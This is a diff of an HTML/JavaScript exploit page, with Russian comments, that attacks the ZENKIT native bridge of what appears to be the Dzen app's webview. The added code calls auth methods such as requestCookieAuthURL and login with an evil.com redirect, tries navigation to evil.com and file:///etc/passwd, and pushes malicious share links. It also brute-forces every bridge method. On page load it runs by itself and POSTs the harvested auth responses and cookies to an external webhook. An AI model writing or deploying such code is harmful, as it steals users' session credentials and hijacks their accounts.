@@ -3,24 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ZenKit Exploit Research</title>
+    <title>ZenKit Method Exploit</title>
     <style>
         body {
             font-family: monospace;
             padding: 15px;
             background: #0d1117;
             color: #c9d1d9;
-            font-size: 14px;
+            font-size: 13px;
         }
-        h1 { color: #58a6ff; font-size: 18px; }
-        h2 { color: #f0883e; font-size: 16px; margin-top: 25px; }
+        h1 { color: #f85149; font-size: 16px; }
+        h2 { color: #58a6ff; font-size: 14px; margin-top: 20px; }
         #results {
             background: #161b22;
             padding: 15px;
             border-radius: 8px;
             white-space: pre-wrap;
             word-break: break-all;
-            max-height: 300px;
+            max-height: 250px;
             overflow-y: auto;
             margin: 10px 0;
             border: 1px solid #30363d;
@@ -28,23 +28,21 @@
         .found { color: #3fb950; }
         .warn { color: #d29922; }
         .error { color: #f85149; }
-        .info { color: #58a6ff; }
+        .critical { color: #f85149; font-weight: bold; }
         button {
-            padding: 10px 15px;
-            margin: 5px;
+            padding: 8px 12px;
+            margin: 3px;
             background: #238636;
             color: #fff;
             border: none;
             border-radius: 6px;
             cursor: pointer;
-            font-size: 12px;
+            font-size: 11px;
         }
-        button:hover { background: #2ea043; }
-        .btn-danger { background: #da3633; }
-        .btn-danger:hover { background: #f85149; }
+        .btn-critical { background: #da3633; }
         .section {
-            margin: 20px 0;
-            padding: 15px;
+            margin: 15px 0;
+            padding: 12px;
             background: #161b22;
             border-radius: 8px;
             border: 1px solid #30363d;
@@ -52,446 +50,414 @@
     </style>
 </head>
 <body>
-    <h1>🔓 ZenKit Interface Exploitation</h1>
+    <h1>🔓 ZenKit Critical Exploit</h1>
     
     <div class="section">
-        <h2>1. Dump Interfaces</h2>
-        <button onclick="dumpZenkit()">Dump ZENKIT</button>
-        <button onclick="dumpNativeZenkit()">Dump NATIVE_ZENKIT</button>
-        <button onclick="dumpLaunchOptions()">Dump LAUNCH_OPTIONS</button>
-        <button onclick="dumpAll()">DUMP ALL</button>
+        <h2>🔑 AUTH & COOKIES (CRITICAL)</h2>
+        <button class="btn-critical" onclick="tryRequestCookieAuthURL()">requestCookieAuthURL()</button>
+        <button class="btn-critical" onclick="tryLogin()">login()</button>
+        <button class="btn-critical" onclick="tryRefreshConfig()">refreshConfig()</button>
     </div>
     
     <div class="section">
-        <h2>2. Try Common Methods</h2>
-        <button onclick="tryGetUser()">Get User Info</button>
-        <button onclick="tryGetToken()">Get Token</button>
-        <button onclick="tryGetConfig()">Get Config</button>
-        <button onclick="tryGetCookies()">Get Cookies</button>
+        <h2>📱 NATIVE ACTIONS</h2>
+        <button onclick="tryNavigate()">navigate()</button>
+        <button onclick="tryOpenSettings()">openSettings()</button>
+        <button onclick="tryOpenBell()">openBell()</button>
+        <button onclick="tryCapturePhoto()">captureDocumentPhoto()</button>
+        <button onclick="tryShare()">share()</button>
     </div>
     
     <div class="section">
-        <h2>3. Dangerous Actions</h2>
-        <button class="btn-danger" onclick="tryOpenUrl()">Open URL</button>
-        <button class="btn-danger" onclick="tryPostMessage()">Post Message</button>
-        <button class="btn-danger" onclick="tryCallNative()">Call Native</button>
+        <h2>📝 DATA MANIPULATION</h2>
+        <button onclick="tryUpdateStorage()">updateStorage()</button>
+        <button onclick="tryArticleUpdate()">articleUpdate()</button>
+        <button onclick="tryInterestSubscribe()">interestSubscribe()</button>
+        <button onclick="tryShowCreatePublication()">showCreatePublicationScreen()</button>
     </div>
     
-    <div id="results">Результаты появятся здесь...</div>
+    <div class="section">
+        <h2>🔍 INFO GATHERING</h2>
+        <button onclick="tryOnReady()">onReady()</button>
+        <button onclick="tryArticleInit()">articleInit()</button>
+        <button onclick="listenEvents()">Listen All Events</button>
+        <button onclick="bruteforceCall()">Bruteforce Params</button>
+    </div>
+    
+    <div id="results">Результаты...</div>
     
     <div class="section">
-        <h2>4. Send Results to Server</h2>
-        <button onclick="sendToServer()">📤 Send to Webhook</button>
+        <button class="btn-critical" onclick="sendResults()">📤 SEND ALL TO WEBHOOK</button>
     </div>
 
     <script>
-        var resultsDiv = document.getElementById('results');
-        var collectedData = {};
+        var results = document.getElementById('results');
+        var collectedData = { methods: {}, responses: {} };
         
         function log(msg, type) {
-            var className = type || '';
-            resultsDiv.innerHTML += '<span class="' + className + '">' + msg + '</span>\n';
-            resultsDiv.scrollTop = resultsDiv.scrollHeight;
+            results.innerHTML += '<span class="' + (type || '') + '">' + msg + '</span>\n';
+            results.scrollTop = results.scrollHeight;
+            console.log(msg);
         }
         
-        function clear() {
-            resultsDiv.innerHTML = '';
-        }
+        function clear() { results.innerHTML = ''; }
         
-        function stringify(obj, depth) {
-            depth = depth || 0;
-            if (depth > 3) return '[MAX DEPTH]';
-            
-            try {
-                if (obj === null) return 'null';
-                if (obj === undefined) return 'undefined';
-                if (typeof obj === 'function') return '[Function: ' + (obj.name || 'anonymous') + ']';
-                if (typeof obj !== 'object') return String(obj);
-                
-                var result = '{\n';
-                var keys = [];
-                
-                // Получаем все свойства
-                for (var key in obj) {
-                    keys.push(key);
-                }
-                try {
-                    keys = keys.concat(Object.getOwnPropertyNames(obj));
-                } catch(e) {}
-                
-                // Уникальные ключи
-                keys = keys.filter(function(v, i, a) { return a.indexOf(v) === i; });
-                
-                for (var i = 0; i < keys.length && i < 50; i++) {
-                    var key = keys[i];
-                    try {
-                        var val = obj[key];
-                        var indent = '  '.repeat(depth + 1);
-                        result += indent + key + ': ' + stringify(val, depth + 1) + '\n';
-                    } catch(e) {
-                        result += '  '.repeat(depth + 1) + key + ': [Error: ' + e.message + ']\n';
-                    }
-                }
-                
-                if (keys.length > 50) {
-                    result += '  '.repeat(depth + 1) + '... and ' + (keys.length - 50) + ' more\n';
-                }
-                
-                return result + '  '.repeat(depth) + '}';
-            } catch(e) {
-                return '[Error: ' + e.message + ']';
-            }
-        }
+        // ========== CRITICAL: AUTH METHODS ==========
         
-        function dumpZenkit() {
+        function tryRequestCookieAuthURL() {
             clear();
-            log('=== ZENKIT OBJECT ===\n', 'info');
+            log('=== requestCookieAuthURL() ===\n', 'critical');
             
-            if (typeof ZENKIT === 'undefined') {
-                log('ZENKIT is undefined!', 'error');
-                return;
-            }
+            // Пробуем разные варианты вызова
+            var variants = [
+                function() { return ZENKIT.requestCookieAuthURL(); },
+                function() { return ZENKIT.requestCookieAuthURL({}); },
+                function() { return ZENKIT.requestCookieAuthURL('https://dzen.ru'); },
+                function() { return ZENKIT.requestCookieAuthURL({url: 'https://dzen.ru'}); },
+                function() { return NATIVE_ZENKIT.requestCookieAuthURL(); },
+                function() { return NATIVE_ZENKIT.requestCookieAuthURL(''); }
+            ];
             
-            collectedData.ZENKIT = {};
-            
-            log('Type: ' + typeof ZENKIT, 'info');
-            log('\nMethods and Properties:\n', 'warn');
-            
-            var keys = Object.getOwnPropertyNames(ZENKIT);
-            for (var i = 0; i < keys.length; i++) {
-                var key = keys[i];
+            variants.forEach(function(fn, i) {
                 try {
-                    var val = ZENKIT[key];
-                    var type = typeof val;
-                    collectedData.ZENKIT[key] = type;
+                    log('Variant ' + i + ':', 'warn');
+                    var result = fn();
+                    log('Result: ' + JSON.stringify(result), 'found');
+                    collectedData.responses.cookieAuthURL = result;
                     
-                    if (type === 'function') {
-                        log('✓ ' + key + '() - FUNCTION', 'found');
-                        // Попробуем получить параметры
-                        try {
-                            log('  Signature: ' + val.toString().split('{')[0], 'info');
-                        } catch(e) {}
-                    } else {
-                        log('  ' + key + ': ' + stringify(val), '');
+                    // Если это Promise
+                    if (result && typeof result.then === 'function') {
+                        result.then(function(data) {
+                            log('🔑 PROMISE RESOLVED: ' + JSON.stringify(data), 'critical');
+                            collectedData.responses.cookieAuthURL_resolved = data;
+                            sendResults();
+                        }).catch(function(err) {
+                            log('Promise rejected: ' + err, 'error');
+                        });
                     }
                 } catch(e) {
-                    log('✗ ' + key + ': [Error: ' + e.message + ']', 'error');
+                    log('Error: ' + e.message, 'error');
                 }
+            });
+        }
+        
+        function tryLogin() {
+            clear();
+            log('=== login() ===\n', 'critical');
+            
+            var variants = [
+                function() { return ZENKIT.login(); },
+                function() { return ZENKIT.login({}); },
+                function() { return ZENKIT.login({redirect: 'https://evil.com'}); },
+                function() { return NATIVE_ZENKIT.login(); }
+            ];
+            
+            variants.forEach(function(fn, i) {
+                try {
+                    log('Variant ' + i + ':', 'warn');
+                    var result = fn();
+                    log('Result: ' + JSON.stringify(result), 'found');
+                    
+                    if (result && typeof result.then === 'function') {
+                        result.then(function(data) {
+                            log('🔑 LOGIN DATA: ' + JSON.stringify(data), 'critical');
+                            collectedData.responses.login = data;
+                            sendResults();
+                        }).catch(function(err) {
+                            log('Promise rejected: ' + err, 'error');
+                        });
+                    }
+                } catch(e) {
+                    log('Error: ' + e.message, 'error');
+                }
+            });
+        }
+        
+        function tryRefreshConfig() {
+            clear();
+            log('=== refreshConfig() ===\n', 'warn');
+            
+            try {
+                var result = ZENKIT.refreshConfig();
+                log('Result: ' + JSON.stringify(result), 'found');
+                
+                if (result && typeof result.then === 'function') {
+                    result.then(function(data) {
+                        log('CONFIG DATA: ' + JSON.stringify(data, null, 2), 'critical');
+                        collectedData.responses.config = data;
+                    }).catch(function(err) {
+                        log('Error: ' + err, 'error');
+                    });
+                }
+            } catch(e) {
+                log('Error: ' + e.message, 'error');
             }
         }
         
-        function dumpNativeZenkit() {
+        // ========== NATIVE ACTIONS ==========
+        
+        function tryNavigate() {
             clear();
-            log('=== NATIVE_ZENKIT OBJECT ===\n', 'info');
+            log('=== navigate() ===\n', 'warn');
             
-            if (typeof NATIVE_ZENKIT === 'undefined') {
-                log('NATIVE_ZENKIT is undefined!', 'error');
-                return;
-            }
+            var urls = [
+                'https://evil.com',
+                'dzen://settings',
+                'dzen://profile',
+                '/settings',
+                '/profile',
+                'file:///etc/passwd'
+            ];
             
-            collectedData.NATIVE_ZENKIT = {};
-            
-            log('Type: ' + typeof NATIVE_ZENKIT, 'info');
-            log('\nMethods and Properties:\n', 'warn');
-            
-            // Пробуем разные способы получить свойства
-            var keys = [];
-            try { keys = keys.concat(Object.keys(NATIVE_ZENKIT)); } catch(e) {}
-            try { keys = keys.concat(Object.getOwnPropertyNames(NATIVE_ZENKIT)); } catch(e) {}
-            try { 
-                for (var k in NATIVE_ZENKIT) keys.push(k);
-            } catch(e) {}
-            
-            // Уникальные
-            keys = keys.filter(function(v, i, a) { return a.indexOf(v) === i; });
-            
-            if (keys.length === 0) {
-                log('No enumerable properties found. Trying common method names...', 'warn');
-                
-                var commonMethods = [
-                    'getUser', 'getUserInfo', 'getToken', 'getAccessToken',
-                    'getConfig', 'getSettings', 'getData', 'getState',
-                    'init', 'initialize', 'call', 'invoke', 'execute',
-                    'postMessage', 'sendMessage', 'emit', 'dispatch',
-                    'openUrl', 'openLink', 'navigate', 'redirect',
-                    'showAlert', 'showDialog', 'toast',
-                    'getDeviceId', 'getDeviceInfo', 'getPlatform',
-                    'getCookies', 'getStorage', 'getSession',
-                    'login', 'logout', 'authorize', 'auth'
-                ];
-                
-                for (var i = 0; i < commonMethods.length; i++) {
-                    var method = commonMethods[i];
-                    try {
-                        if (typeof NATIVE_ZENKIT[method] !== 'undefined') {
-                            log('✓ ' + method + ' EXISTS!', 'found');
-                            collectedData.NATIVE_ZENKIT[method] = typeof NATIVE_ZENKIT[method];
-                        }
-                    } catch(e) {}
+            urls.forEach(function(url) {
+                try {
+                    log('Trying: ' + url, '');
+                    var result = ZENKIT.navigate(url);
+                    log('Result: ' + JSON.stringify(result), 'found');
+                } catch(e) {
+                    log('Error: ' + e.message, 'error');
                 }
-            } else {
-                for (var i = 0; i < keys.length; i++) {
-                    var key = keys[i];
+            });
+            
+            // С объектом
+            try {
+                log('\nWith object:', '');
+                var result = ZENKIT.navigate({url: 'https://evil.com', external: true});
+                log('Result: ' + JSON.stringify(result), 'found');
+            } catch(e) {
+                log('Error: ' + e.message, 'error');
+            }
+        }
+        
+        function tryOpenSettings() {
+            clear();
+            log('=== openSettings() ===\n', 'warn');
+            try {
+                var result = ZENKIT.openSettings();
+                log('Result: ' + JSON.stringify(result), 'found');
+            } catch(e) {
+                log('Error: ' + e.message, 'error');
+            }
+        }
+        
+        function tryOpenBell() {
+            clear();
+            log('=== openBell() ===\n', 'warn');
+            try {
+                var result = ZENKIT.openBell();
+                log('Result: ' + JSON.stringify(result), 'found');
+            } catch(e) {
+                log('Error: ' + e.message, 'error');
+            }
+        }
+        
+        function tryCapturePhoto() {
+            clear();
+            log('=== captureDocumentPhoto() ===\n', 'warn');
+            try {
+                var result = ZENKIT.captureDocumentPhoto();
+                log('Result: ' + JSON.stringify(result), 'found');
+                
+                if (result && typeof result.then === 'function') {
+                    result.then(function(data) {
+                        log('📸 PHOTO DATA: ' + JSON.stringify(data), 'critical');
+                        collectedData.responses.photo = data;
+                    }).catch(function(err) {
+                        log('Error: ' + err, 'error');
+                    });
+                }
+            } catch(e) {
+                log('Error: ' + e.message, 'error');
+            }
+        }
+        
+        function tryShare() {
+            clear();
+            log('=== share() ===\n', 'warn');
+            
+            var variants = [
+                {text: 'Hacked by attacker', url: 'https://evil.com'},
+                {title: 'Check this', text: 'Malicious link', url: 'https://evil.com'},
+                'https://evil.com'
+            ];
+            
+            variants.forEach(function(params, i) {
+                try {
+                    log('Variant ' + i + ': ' + JSON.stringify(params), '');
+                    var result = ZENKIT.share(params);
+                    log('Result: ' + JSON.stringify(result), 'found');
+                } catch(e) {
+                    log('Error: ' + e.message, 'error');
+                }
+            });
+        }
+        
+        // ========== DATA MANIPULATION ==========
+        
+        function tryUpdateStorage() {
+            clear();
+            log('=== updateStorage() ===\n', 'warn');
+            
+            try {
+                // Пробуем записать данные
+                var result = ZENKIT.updateStorage({key: 'evil', value: 'hacked'});
+                log('Write result: ' + JSON.stringify(result), 'found');
+                
+                // Пробуем прочитать
+                var result2 = ZENKIT.updateStorage({action: 'get'});
+                log('Read result: ' + JSON.stringify(result2), 'found');
+            } catch(e) {
+                log('Error: ' + e.message, 'error');
+            }
+        }
+        
+        function tryArticleUpdate() {
+            clear();
+            log('=== articleUpdate() ===\n', 'warn');
+            try {
+                var result = ZENKIT.articleUpdate({id: '123', liked: true});
+                log('Result: ' + JSON.stringify(result), 'found');
+            } catch(e) {
+                log('Error: ' + e.message, 'error');
+            }
+        }
+        
+        function tryInterestSubscribe() {
+            clear();
+            log('=== interestSubscribe() ===\n', 'warn');
+            try {
+                var result = ZENKIT.interestSubscribe({interest: 'hacking'});
+                log('Result: ' + JSON.stringify(result), 'found');
+            } catch(e) {
+                log('Error: ' + e.message, 'error');
+            }
+        }
+        
+        function tryShowCreatePublication() {
+            clear();
+            log('=== showCreatePublicationScreen() ===\n', 'warn');
+            try {
+                var result = ZENKIT.showCreatePublicationScreen();
+                log('Result: ' + JSON.stringify(result), 'found');
+            } catch(e) {
+                log('Error: ' + e.message, 'error');
+            }
+        }
+        
+        // ========== INFO GATHERING ==========
+        
+        function tryOnReady() {
+            clear();
+            log('=== onReady() ===\n', 'warn');
+            try {
+                var result = ZENKIT.onReady();
+                log('Result: ' + JSON.stringify(result), 'found');
+                
+                if (result && typeof result.then === 'function') {
+                    result.then(function(data) {
+                        log('READY DATA: ' + JSON.stringify(data, null, 2), 'critical');
+                        collectedData.responses.ready = data;
+                    });
+                }
+            } catch(e) {
+                log('Error: ' + e.message, 'error');
+            }
+        }
+        
+        function tryArticleInit() {
+            clear();
+            log('=== articleInit() ===\n', 'warn');
+            try {
+                var result = ZENKIT.articleInit();
+                log('Result: ' + JSON.stringify(result), 'found');
+                
+                if (result && typeof result.then === 'function') {
+                    result.then(function(data) {
+                        log('INIT DATA: ' + JSON.stringify(data, null, 2), 'critical');
+                        collectedData.responses.init = data;
+                    });
+                }
+            } catch(e) {
+                log('Error: ' + e.message, 'error');
+            }
+        }
+        
+        function listenEvents() {
+            clear();
+            log('=== Listening to ALL events ===\n', 'warn');
+            
+            var events = [
+                'ready', 'config', 'user', 'auth', 'login', 'logout',
+                'navigation', 'error', 'data', 'storage', 'message'
+            ];
+            
+            events.forEach(function(event) {
+                try {
+                    ZENKIT.on(event, function(data) {
+                        log('EVENT [' + event + ']: ' + JSON.stringify(data), 'critical');
+                        collectedData.responses['event_' + event] = data;
+                    });
+                    log('Subscribed to: ' + event, 'found');
+                } catch(e) {}
+            });
+            
+            log('\nWaiting for events...', 'warn');
+        }
+        
+        function bruteforceCall() {
+            clear();
+            log('=== Bruteforce method calls ===\n', 'warn');
+            
+            var methods = Object.keys(ZENKIT);
+            
+            methods.forEach(function(method) {
+                if (typeof ZENKIT[method] === 'function' && method !== 'on' && method !== 'off') {
                     try {
-                        var val = NATIVE_ZENKIT[key];
-                        var type = typeof val;
-                        collectedData.NATIVE_ZENKIT[key] = type;
+                        log('Calling ' + method + '()...', '');
+                        var result = ZENKIT[method]();
                         
-                        if (type === 'function') {
-                            log('✓ ' + key + '() - FUNCTION', 'found');
-                        } else {
-                            log('  ' + key + ': ' + stringify(val), '');
-                        }
-                    } catch(e) {
-                        log('✗ ' + key + ': [Error]', 'error');
-                    }
-                }
-            }
-        }
-        
-        function dumpLaunchOptions() {
-            clear();
-            log('=== ZENKIT_LAUNCH_OPTIONS ===\n', 'info');
-            
-            if (typeof ZENKIT_LAUNCH_OPTIONS === 'undefined') {
-                log('ZENKIT_LAUNCH_OPTIONS is undefined!', 'error');
-                return;
-            }
-            
-            collectedData.LAUNCH_OPTIONS = ZENKIT_LAUNCH_OPTIONS;
-            log(stringify(ZENKIT_LAUNCH_OPTIONS), 'found');
-        }
-        
-        function dumpAll() {
-            clear();
-            
-            log('=== FULL DUMP ===\n', 'info');
-            
-            // ZENKIT
-            log('\n--- ZENKIT ---', 'warn');
-            if (typeof ZENKIT !== 'undefined') {
-                log(stringify(ZENKIT), '');
-            }
-            
-            // NATIVE_ZENKIT  
-            log('\n--- NATIVE_ZENKIT ---', 'warn');
-            if (typeof NATIVE_ZENKIT !== 'undefined') {
-                log(stringify(NATIVE_ZENKIT), '');
-            }
-            
-            // LAUNCH OPTIONS
-            log('\n--- ZENKIT_LAUNCH_OPTIONS ---', 'warn');
-            if (typeof ZENKIT_LAUNCH_OPTIONS !== 'undefined') {
-                log(stringify(ZENKIT_LAUNCH_OPTIONS), '');
-            }
-            
-            // handleZenKitPromiseResult
-            log('\n--- handleZenKitPromiseResult ---', 'warn');
-            if (typeof handleZenKitPromiseResult !== 'undefined') {
-                log('Type: ' + typeof handleZenKitPromiseResult, '');
-                log(handleZenKitPromiseResult.toString(), '');
-            }
-            
-            // onZenKitEvent
-            log('\n--- onZenKitEvent ---', 'warn');
-            if (typeof onZenKitEvent !== 'undefined') {
-                log('Type: ' + typeof onZenKitEvent, '');
-                log(onZenKitEvent.toString(), '');
-            }
-            
-            // Cookies & Storage
-            log('\n--- COOKIES ---', 'warn');
-            log(document.cookie || '[empty]', '');
-            
-            log('\n--- LOCAL STORAGE ---', 'warn');
-            try {
-                for (var i = 0; i < localStorage.length; i++) {
-                    var key = localStorage.key(i);
-                    log(key + ': ' + localStorage.getItem(key).substring(0, 100), '');
-                }
-            } catch(e) { log('Error: ' + e.message, 'error'); }
-        }
-        
-        function tryGetUser() {
-            clear();
-            log('=== TRYING TO GET USER INFO ===\n', 'info');
-            
-            var methods = ['getUser', 'getUserInfo', 'user', 'getProfile', 'getAccount'];
-            
-            [ZENKIT, NATIVE_ZENKIT].forEach(function(obj, idx) {
-                var name = idx === 0 ? 'ZENKIT' : 'NATIVE_ZENKIT';
-                if (typeof obj === 'undefined') return;
-                
-                methods.forEach(function(method) {
-                    try {
-                        if (typeof obj[method] === 'function') {
-                            log('Calling ' + name + '.' + method + '()...', 'warn');
-                            var result = obj[method]();
-                            log('Result: ' + stringify(result), 'found');
-                            collectedData.userInfo = result;
-                        }
-                    } catch(e) {
-                        log(name + '.' + method + ' error: ' + e.message, 'error');
-                    }
-                });
-            });
-        }
-        
-        function tryGetToken() {
-            clear();
-            log('=== TRYING TO GET TOKENS ===\n', 'info');
-            
-            var methods = ['getToken', 'getAccessToken', 'getAuthToken', 'token', 'getSession'];
-            
-            [ZENKIT, NATIVE_ZENKIT].forEach(function(obj, idx) {
-                var name = idx === 0 ? 'ZENKIT' : 'NATIVE_ZENKIT';
-                if (typeof obj === 'undefined') return;
-                
-                methods.forEach(function(method) {
-                    try {
-                        if (typeof obj[method] === 'function') {
-                            log('Calling ' + name + '.' + method + '()...', 'warn');
-                            var result = obj[method]();
-                            log('🔑 TOKEN: ' + stringify(result), 'found');
-                            collectedData.token = result;
-                        }
-                    } catch(e) {
-                        log(name + '.' + method + ' error: ' + e.message, 'error');
-                    }
-                });
-            });
-        }
-        
-        function tryGetConfig() {
-            clear();
-            log('=== TRYING TO GET CONFIG ===\n', 'info');
-            
-            var methods = ['getConfig', 'getSettings', 'config', 'settings', 'getEnvironment'];
-            
-            [ZENKIT, NATIVE_ZENKIT].forEach(function(obj, idx) {
-                var name = idx === 0 ? 'ZENKIT' : 'NATIVE_ZENKIT';
-                if (typeof obj === 'undefined') return;
-                
-                methods.forEach(function(method) {
-                    try {
-                        if (typeof obj[method] === 'function') {
-                            log('Calling ' + name + '.' + method + '()...', 'warn');
-                            var result = obj[method]();
-                            log('Result: ' + stringify(result), 'found');
+                        if (result && typeof result.then === 'function') {
+                            result.then(function(data) {
+                                if (data) {
+                                    log('✓ ' + method + ' returned: ' + JSON.stringify(data).substring(0, 200), 'found');
+                                    collectedData.methods[method] = data;
+                                }
+                            }).catch(function(){});
+                        } else if (result) {
+                            log('✓ ' + method + ' = ' + JSON.stringify(result).substring(0, 100), 'found');
                         }
                     } catch(e) {}
-                });
+                }
             });
         }
         
-        function tryGetCookies() {
-            clear();
-            log('=== COOKIES & STORAGE ===\n', 'info');
-            
-            log('Document cookies:', 'warn');
-            log(document.cookie || '[empty]', 'found');
-            
-            log('\nLocalStorage:', 'warn');
-            try {
-                for (var i = 0; i < localStorage.length; i++) {
-                    var key = localStorage.key(i);
-                    var val = localStorage.getItem(key);
-                    log(key + ': ' + val, 'found');
-                    collectedData['localStorage_' + key] = val;
-                }
-            } catch(e) { log('Error: ' + e, 'error'); }
-            
-            log('\nSessionStorage:', 'warn');
-            try {
-                for (var i = 0; i < sessionStorage.length; i++) {
-                    var key = sessionStorage.key(i);
-                    var val = sessionStorage.getItem(key);
-                    log(key + ': ' + val, 'found');
-                }
-            } catch(e) { log('Error: ' + e, 'error'); }
-        }
+        // ========== SEND RESULTS ==========
         
-        function tryOpenUrl() {
-            clear();
-            log('=== TRYING TO OPEN URL ===\n', 'info');
+        function sendResults() {
+            collectedData.timestamp = new Date().toISOString();
+            collectedData.userAgent = navigator.userAgent;
+            collectedData.url = window.location.href;
+            collectedData.cookies = document.cookie;
             
-            var methods = ['openUrl', 'openLink', 'navigate', 'open', 'loadUrl'];
-            var testUrl = 'https://example.com';
+            log('\n📤 Sending to webhook...', 'warn');
             
-            [ZENKIT, NATIVE_ZENKIT].forEach(function(obj, idx) {
-                var name = idx === 0 ? 'ZENKIT' : 'NATIVE_ZENKIT';
-                if (typeof obj === 'undefined') return;
-                
-                methods.forEach(function(method) {
-                    try {
-                        if (typeof obj[method] === 'function') {
-                            log('Found ' + name + '.' + method + '() - NOT calling for safety', 'warn');
-                        }
-                    } catch(e) {}
-                });
-            });
-        }
-        
-        function tryPostMessage() {
-            clear();
-            log('=== POST MESSAGE TEST ===\n', 'info');
-            
-            try {
-                if (typeof ZENKIT.postMessage === 'function') {
-                    log('ZENKIT.postMessage exists!', 'found');
-                }
-                if (typeof ZENKIT.call === 'function') {
-                    log('ZENKIT.call exists!', 'found');
-                }
-            } catch(e) {}
-        }
-        
-        function tryCallNative() {
-            clear();
-            log('=== NATIVE CALL TEST ===\n', 'info');
-            
-            // Пробуем вызвать handleZenKitPromiseResult с тестовыми данными
-            try {
-                if (typeof handleZenKitPromiseResult === 'function') {
-                    log('handleZenKitPromiseResult signature:', 'warn');
-                    log(handleZenKitPromiseResult.toString().substring(0, 500), '');
-                }
-            } catch(e) {}
-            
-            try {
-                if (typeof onZenKitEvent === 'function') {
-                    log('\nonZenKitEvent signature:', 'warn');
-                    log(onZenKitEvent.toString().substring(0, 500), '');
-                }
-            } catch(e) {}
-        }
-        
-        function sendToServer() {
-            var data = {
-                url: window.location.href,
-                userAgent: navigator.userAgent,
-                cookies: document.cookie,
-                collected: collectedData,
-                zenkit: typeof ZENKIT !== 'undefined' ? Object.keys(ZENKIT) : null,
-                nativeZenkit: typeof NATIVE_ZENKIT !== 'undefined' ? 'exists' : null,
-                launchOptions: typeof ZENKIT_LAUNCH_OPTIONS !== 'undefined' ? ZENKIT_LAUNCH_OPTIONS : null
-            };
-            
-            log('\nSending to webhook...', 'info');
-            
-            // Замени на свой webhook
             fetch('https://webhook.tuna.am/387WocKA8chxCpAjoA4S1rxg7cV', {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(collectedData)
             })
-            .then(function(r) { log('✓ Sent successfully!', 'found'); })
+            .then(function() { log('✓ Sent!', 'found'); })
             .catch(function(e) { log('Error: ' + e, 'error'); });
         }
         
-        // Auto-run on load
+        // Auto-run critical methods
         window.onload = function() {
-            dumpAll();
+            log('Auto-running critical methods...\n', 'warn');
+            listenEvents();
+            
+            setTimeout(function() {
+                tryRequestCookieAuthURL();
+            }, 1000);
         };
     </script>
 </body>
